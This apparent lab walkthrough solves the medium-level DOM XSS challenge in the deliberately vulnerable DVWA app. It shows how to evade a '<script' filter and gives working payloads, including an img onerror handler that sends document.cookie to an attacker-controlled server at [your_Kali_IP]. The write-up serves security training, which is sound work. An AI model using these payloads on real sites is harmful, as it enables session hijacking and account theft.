<b>Challenge URL:</b> /dvwa/vulnerabilities/xss_d/
<br>
<b>Objective:</b> Steal the cookie of a logged-in user.
<br>
<b>Tools needed:</b> A temporary web server
<br><br>
<i>Did you remember to read this section's <a href="https://github.com/mrudnitsky/dvwa-guide-2019/blob/master/low/Challenge%2010:%20XSS%20(DOM).md" target="_blank">README</a>?</i>

<h2><b>The Guide</b></h2>

<i>Since this challenge is very similar to the easy mode challenge, I'd highly recommend re-reading <a href="https://github.com/mrudnitsky/dvwa-guide-2019/blob/master/low/Challenge 02: Command Injection.md" target="_blank">our notes from before</a>. We'll be using a lot of the analysis and code from before.</i>

<h3><b>What's Changed</b></h3>

<img src="https://github.com/mrudnitsky/dvwa-guide-2019/blob/master/medium/screenshots/xssdsource.png" width="500">

Upon reviewing the source code for this challenge, we see that the developer simply checks if the URL now has the string <code>&#60;script</code>. If it does, we set the <b>default</b> parameter to "English" and ignore the input. Seems pretty wise, right? Unfortunately not, as there are <a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet#Tests" target="_blank">many, many other ways</a> to trigger a cross-site scripting vulnerability.

<h3><b>Crafting a New Exploit</b></h3>

So let's grab a XSS exploit that doesn't use the <code>&#60;script</code> tag. Once we find one, let's point it to our <code>a.js</code> payload from before. An easy and convenient one would be something like:

<code>&#60;img src='http://[your_Kali_IP]:9999/a.js'></code> 

Let's start by initializing our temporary Kali web server, then by trying to execute the payload as shown above:

<img src="https://github.com/mrudnitsky/dvwa-guide-2019/blob/master/medium/screenshots/xssdfail.png" width="500">

Hm, the URL doesn't change, nor do we see a call to our payload on our webserver. What could be the cause? Let's look at how our dropdown is constructed:

<img src="https://github.com/mrudnitsky/dvwa-guide-2019/blob/master/medium/screenshots/xssdsourceclient.png" width="500">

So it essentially injects whatever we put into the URL into the top row of the dropdown. We can't actually insert an image into a dropdown (<a href="https://stackoverflow.com/questions/4941004/putting-images-with-options-in-a-dropdown-list" target="_blank">source</a>). The next best thing is to modify our payload to break us out of the dropdown completely, so that we can "display" our "image" on the page itself. Let's try something like this:

<code>&#60;/option&#62;&#60;/select&#62;&#60;img src=&#x27;http&#58;//[your_Kali_IP]:9999/a.js&#x27;&#62;</code>

If we put that in our URL, it should work, fingers crossed: 

<b>http&#58;//dvwa/dvwa/vulnerabilities/xss_d/?default=English&#60;/option&#62;&#60;/select&#62;&#60;img src=&#x27;</b>[your_Kali_IP]<b>:9999/a.js&#x27;&#62;</b>

<img src="https://github.com/mrudnitsky/dvwa-guide-2019/blob/master/medium/screenshots/xssdbreakfail.png" width="500">

Hm, no luck. Seems our payload won't be executed, as the web page treats <code>a.js</code> as an actual image rather than code. Let's try putting our payload in the <code>img</code> tag proper, to remove the dependency on using a Javascript file. 

After playing around, we get something like:

<code>&#60;/option&#62;&#60;/select&#62;&#60;img id='pic' src=x onerror="var i = document.getElementById('pic'); i.setAttribute('src','http&#58;//[your_Kali_IP]:9999/' + document.cookie); i.parentNode.removeChild(i); return false;")&#62;</code>

This code does several things:
<ul>
  <li>Gives a label to our <code>img</code> element; we call it 'pic';</li>
  <li>Specifies an invalid <b>src</b> parameter, which doesn't exist. This will trigger the <code>onerror</code> code; and</li>
  <li>Specify an error condition. This can be Javascript, which will execute without using <code>script</code> tags. So we set our image source to a fake URL on our temporary server, which will eventually request a page with the same name as the user's cookie. Right after, we'll delete our element, to keep the error code from continuously triggering and executing a denial-of-service attack on our own server.</li>
</ul>

<img src="https://github.com/mrudnitsky/dvwa-guide-2019/blob/master/medium/screenshots/xssdsuccess.png" width="500">

We did it! We still get the user's cookie given to us remotely, without having to view their screen. Remember that I purposely display only part of the cookie on my end. Challenge complete!
